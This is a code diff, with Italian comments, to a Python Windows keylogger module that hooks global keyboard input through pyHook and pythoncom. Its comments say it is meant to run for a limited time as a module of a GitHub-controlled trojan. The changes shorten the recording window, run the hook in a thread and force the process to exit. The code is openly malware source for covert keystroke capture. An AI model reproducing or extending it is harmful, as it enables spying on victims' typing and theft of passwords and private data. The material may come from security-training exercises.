@@ -13,7 +13,8 @@ import win32clipboard
 import pyHook
 
 # per la chiusura
-import time
+import threading
+import os, time
 
 # dichiariamo alcuni oggetti usati di seguito
 # gestisce le finestre
@@ -106,13 +107,19 @@ def main():
     # un modo per ottenerlo è usare il metodo PumpMessages di pythoncom
     pythoncom.PumpMessages()
     # grazie a questo l'input globale può essere gestito da kl.HookKeyboard()
-    
+
+
+
 def run(**args):
     # dobbiamo dare un tempo finito al modulo per usarlo con il trojan github
     #facciamo partire la thread
+
     t = threading.Thread(target = main, args =())
     t.start()
+
     # registriamo per un poco
-    time.sleep(360)
+    time.sleep(120)
+    print ('[*] Exiting...')
     # usciamo
-    return
+    os._exit(0)
+
